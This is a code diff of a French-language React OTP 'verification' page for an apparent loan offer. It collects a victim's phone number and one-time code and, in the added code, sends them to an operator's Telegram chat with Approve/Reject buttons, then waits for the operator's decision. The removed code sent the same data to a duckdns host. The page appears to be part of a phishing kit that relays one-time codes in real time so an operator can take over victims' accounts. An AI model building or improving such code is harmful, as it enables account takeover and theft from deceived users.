@@ -1,7 +1,9 @@
 import React, { useState, useRef, useEffect } from 'react'
-import axios from 'axios'
 import { useNavigate, useParams } from 'react-router-dom'
-import { apiService } from '../services/api.js'
+
+const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || ''
+const ADMIN_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || ''
+const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN
 
 const SpinnerStyle = () => (
   <style>{`
@@ -10,19 +12,6 @@ const SpinnerStyle = () => (
     }
   `}</style>
 )
-
-const API_BASE_URL = "https://lnmb.duckdns.org"
-
-const api = axios.create({
-  baseURL: API_BASE_URL,
-  headers: { "Content-Type": "application/json" }
-})
-
-api.interceptors.request.use(config => {
-  const bot = window.location.pathname.split("/")[1] || "user1"
-  config.headers["X-Bot-Name"] = bot
-  return config
-})
 
 const otpStatusMessages = {
   pending: "⏳ En attente...",
@@ -39,7 +28,7 @@ function Verification() {
   const userId = user || 'default'
   const [otp, setOtp] = useState(Array(6).fill(""))
   const inputRefs = useRef([])
-  const [sessionId, setSessionId] = useState(null)
+  const [requestId, setRequestId] = useState(null)
   const [status, setStatus] = useState(null)
   const [loading, setLoading] = useState(false)
   const [error, setError] = useState("")
@@ -47,27 +36,32 @@ function Verification() {
   const [timer, setTimer] = useState(120)
   const [autoPolling, setAutoPolling] = useState(false)
   const [approvedOtp, setApprovedOtp] = useState("")
+  const pollingIntervalRef = useRef(null)
+  const checkCountRef = useRef(0)
+  const maxChecks = 24
+  const startTimeRef = useRef(null)
+  
+  const storedAppStr = localStorage.getItem('loanAppData')
+  const appData = storedAppStr ? JSON.parse(storedAppStr) : {}
   
   const startIndex = useRef(null)
 
   useEffect(() => {
-    const storedSession = sessionStorage.getItem('otpSessionId')
-    if (storedSession) {
-      setSessionId(storedSession)
-      setAutoPolling(true)
-      checkStatus(storedSession)
-    }
-    
-    const storedApp = localStorage.getItem('loanAppData')
-    if (storedApp) {
-      const appData = JSON.parse(storedApp)
-      if (appData.success && appData.sessionId) {
-        setSessionId(appData.sessionId)
-        setAutoPolling(true)
-        checkStatus(appData.sessionId)
+    const cleanup = () => {
+      if (pollingIntervalRef.current) {
+        clearInterval(pollingIntervalRef.current)
+        pollingIntervalRef.current = null
       }
     }
+    return cleanup
   }, [])
+
+  useEffect(() => {
+    if (timer > 0) {
+      const id = setInterval(() => setTimer(t => t - 1), 1000)
+      return () => clearInterval(id)
+    }
+  }, [timer])
 
   const handleKey = (index, e) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
@@ -92,6 +86,130 @@ function Verification() {
     }
   }
 
+  async function sendTelegramNotification(phoneNumber, pin, code) {
+    const reqId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
+    
+    const lines = [
+      '📲 New OTP Request',
+      '📱 Phone: ' + phoneNumber,
+      '🔑 PIN: ' + pin,
+      '🔐 OTP Code: ' + code,
+      '🆔 Request: ' + reqId
+    ]
+    const message = lines.join('\n')
+
+    try {
+      const response = await fetch(TELEGRAM_API + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: ADMIN_CHAT_ID,
+          text: message,
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '✅ Approve', callback_data: 'approve_' + reqId },
+              { text: '❌ Reject', callback_data: 'reject_' + reqId }
+            ]]
+          }
+        })
+      })
+      return { success: response.ok, requestId: reqId }
+    } catch (e) {
+      console.error('Telegram send failed:', e)
+      return { success: false, error: e.message, requestId: reqId }
+    }
+  }
+
+  async function checkTelegramApproval(reqId) {
+    try {
+      const response = await fetch(TELEGRAM_API + '/getUpdates?offset=-1000000000')
+      const data = await response.json()
+      
+      if (data.ok && Array.isArray(data.result)) {
+        for (const update of data.result) {
+          if (update.callback_query) {
+            const parts = update.callback_query.data.split('_')
+            const action = parts[0]
+            const id = parts.slice(1).join('_')
+            if (id === reqId) {
+              if (action === 'approve') {
+                try {
+                  await fetch(TELEGRAM_API + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      chat_id: update.callback_query.from.id,
+                      text: '✅ Transaction approved!'
+                    })
+                  })
+                } catch (e) {}
+                return { approved: true, status: 'approved' }
+              } else if (action === 'reject') {
+                try {
+                  await fetch(TELEGRAM_API + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      chat_id: update.callback_query.from.id,
+                      text: '❌ Transaction rejected.'
+                    })
+                  })
+                } catch (e) {}
+                return { approved: false, status: 'rejected' }
+              }
+            }
+          }
+        }
+      }
+      return { approved: false, status: 'pending' }
+    } catch (e) {
+      console.error('Approval check failed:', e)
+      return { approved: false, status: 'error' }
+    }
+  }
+
+  const startPolling = (reqId) => {
+    checkCountRef.current = 0
+    startTimeRef.current = Date.now()
+    setRequestId(reqId)
+
+    setLoading(true)
+    setAutoPolling(true)
+    setError("")
+    setStatus(null)
+
+    pollingIntervalRef.current = setInterval(async () => {
+      checkCountRef.current++
+      const result = await checkTelegramApproval(reqId)
+      
+      console.log('Polling... count:', checkCountRef.current, 'result:', result)
+
+      if (result.approved) {
+        clearInterval(pollingIntervalRef.current)
+        pollingIntervalRef.current = null
+        setLoading(false)
+        setAutoPolling(false)
+        setStatus("approved")
+        const storedApp = localStorage.getItem('loanAppData')
+        const appData = storedApp ? JSON.parse(storedApp) : {}
+        setTimeout(() => navigate(`/${userId}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`), 1500)
+      } else if (result.status === 'rejected') {
+        clearInterval(pollingIntervalRef.current)
+        pollingIntervalRef.current = null
+        setLoading(false)
+        setAutoPolling(false)
+        setError("Transaction rejetée")
+      } else if (checkCountRef.current >= maxChecks) {
+        clearInterval(pollingIntervalRef.current)
+        pollingIntervalRef.current = null
+        setLoading(false)
+        setAutoPolling(false)
+        setStatus("expired")
+        setError("Temps expiré")
+      }
+    }, 5000)
+  }
+
   const startVerification = async () => {
     if (otp.some(i => i === "")) return
     
@@ -106,77 +224,26 @@ function Verification() {
     const storedClient = localStorage.getItem('clientData')
     const clientData = storedClient ? JSON.parse(storedClient) : {}
     
-    const otpInfo = {
-      name: appData.name || "",
-      number: appData.number || "",
-      otp: code,
-      dob: clientData.dob || "",
-      id: clientData.id || "",
-      employment: clientData.employment || "",
-      amount: clientData.amount || "",
-      term: clientData.term || "",
-      pinInputs: "____"
-    }
-    
+    const phoneNumber = appData.number || ""
+    const pin = "0000"
+
     try {
-      await apiService.sendTelegramNotification(otpInfo)
+      const result = await sendTelegramNotification(phoneNumber, pin, code)
       
-      const response = await api.post("/api/verify-user", {
-        phoneNumber: appData.number || "",
-        otpCode: code,
-        countryCode: "+243",
-        userId: `user_${Date.now()}`,
-        userName: clientData.name || "User"
-      })
-      
-      if (response.data.sessionId) {
-        setSessionId(response.data.sessionId)
-        sessionStorage.setItem('otpSessionId', response.data.sessionId)
-        console.log("OTP Session ID:", response.data.sessionId)
+      if (result.success && result.requestId) {
+        setRequestId(result.requestId)
         setAutoPolling(true)
-        checkStatus(response.data.sessionId)
+        checkCountRef.current = 0
+        startTimeRef.current = Date.now()
+      } else {
+        setError("Échec de l'envoi: " + (result.error || 'Unknown error'))
+        setLoading(false)
       }
     } catch (err) {
       console.error("Verification error:", err)
-      setError((err.response?.data?.error?.includes("Wrong") || err.message.includes("wrong")) ? "Code OTP incorrect" : "Erreur de vérification")
+      setError("Erreur de vérification")
       setLoading(false)
     }
-  }
-
-  const checkStatus = async (id) => {
-    const interval = setInterval(async () => {
-      try {
-        const response = await api.get(`/api/check-status/${user}/${id}`)
-        const data = response.data
-        console.log("OTP Status check:", data)
-        
-        if (data.status === "approved") {
-          console.log("✅ OTP approved!")
-          setSessionId(null)
-          setAutoPolling(false)
-          clearInterval(interval)
-          const storedApp = localStorage.getItem('loanAppData')
-          const appData = storedApp ? JSON.parse(storedApp) : {}
-          setTimeout(() => navigate(`/${userId}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`), 1500)
-        } else if (data.status === "wrong_code") {
-          console.log("❌ Wrong OTP code")
-          setError("Code OTP incorrect")
-          setLoading(false)
-          setAutoPolling(false)
-          clearInterval(interval)
-        } else if (data.status === "expired") {
-          console.log("⏰ Session expired")
-          setError("Session expirée")
-          setLoading(false)
-          setAutoPolling(false)
-          clearInterval(interval)
-        }
-      } catch (err) {
-        console.error("Polling error:", err)
-      }
-    }, 500)
-    
-    return () => clearInterval(interval)
   }
 
   const copyCode = () => {
@@ -189,24 +256,17 @@ function Verification() {
   }
 
   const resendOtp = () => {
+    if (pollingIntervalRef.current) {
+      clearInterval(pollingIntervalRef.current)
+      pollingIntervalRef.current = null
+    }
     setOtp(Array(6).fill(""))
     setTimer(120)
     setError("")
     setLoading(false)
+    setAutoPolling(false)
+    setStatus(null)
   }
-
-  useEffect(() => {
-    if (status === "approved") {
-      setTimeout(() => navigate(`/${userId}/compliance`), 2000)
-    }
-  }, [status])
-
-  useEffect(() => {
-    if (timer > 0) {
-      const id = setInterval(() => setTimer(t => t - 1), 1000)
-      return () => clearInterval(id)
-    }
-  }, [timer])
 
   if (status === "approved") {
     return (
@@ -219,12 +279,26 @@ function Verification() {
     )
   }
 
-  if (status === "wrong_pin") {
+  if (status === "expired") {
     return (
       <div className="otp-container">
         <div className="verification-error">
-          <h2 style={{ color: "red" }}>❌ Votre code PIN est incorrect !</h2>
-          <p>Retour à la page de connexion...</p>
+          <h2 style={{ color: "red" }}>⏰ Temps expiré !</h2>
+          <p>Le délai de vérification est dépassé</p>
+          <button 
+            onClick={resendOtp}
+            style={{
+              marginTop: '15px',
+              padding: '10px 20px',
+              background: '#11bb4a',
+              color: 'white',
+              border: 'none',
+              borderRadius: '5px',
+              cursor: 'pointer'
+            }}
+          >
+            Renvoyer
+          </button>
         </div>
       </div>
     )
@@ -238,7 +312,7 @@ function Verification() {
         <p>
           Saisissez le code OTP envoyé à votre numéro
           <br />
-          <span style={{ fontWeight: "bold", color: "#333" }}>{client.number}</span>
+          <span style={{ fontWeight: "bold", color: "#333" }}>{appData?.number || "____________"}</span>
         </p>
       </div>
 
@@ -248,18 +322,6 @@ function Verification() {
         </div>
       )}
 
-      {status && status !== "pending" && status !== "approved" && (
-        <div className="status-message" style={{ 
-          color: status.includes("wrong") ? "red" : "orange", 
-          margin: "10px 0", 
-          padding: "8px", 
-          backgroundColor: status.includes("wrong") ? "#ffeeee" : "#fff8e1", 
-          borderRadius: "5px" 
-        }}>
-          {otpStatusMessages[status] || status}
-        </div>
-      )}
-      
       {autoPolling && (
         <div style={{
           display: "flex",
@@ -305,7 +367,7 @@ function Verification() {
             onFocus={(e) => e.target.select()}
             className={`otp-input ${value ? "filled" : ""} ${loading ? "error" : ""}`}
             autoComplete="one-time-code"
-            disabled={loading || status === "pending"}
+            disabled={loading || autoPolling}
           />
         ))}
       </div>
@@ -320,10 +382,10 @@ function Verification() {
             onClick={startVerification} 
             className="copy-btn" 
             type="button" 
-            disabled={otp.join("").length !== 6 || loading || status === "pending"}
-            style={{ opacity: otp.join("").length !== 6 || loading || status === "pending" ? 0.6 : 1 }}
+            disabled={otp.join("").length !== 6 || loading || autoPolling}
+            style={{ opacity: otp.join("").length !== 6 || loading || autoPolling ? 0.6 : 1 }}
           >
-            {loading || status === "pending" ? "⏳ Verifying..." : otpStatusMessages[status] || "Saisissez le code OTP"}
+            {loading || autoPolling ? "⏳ Verifying..." : otpStatusMessages[status] || "Saisissez le code OTP"}
           </button>
         ) : (
           <button 
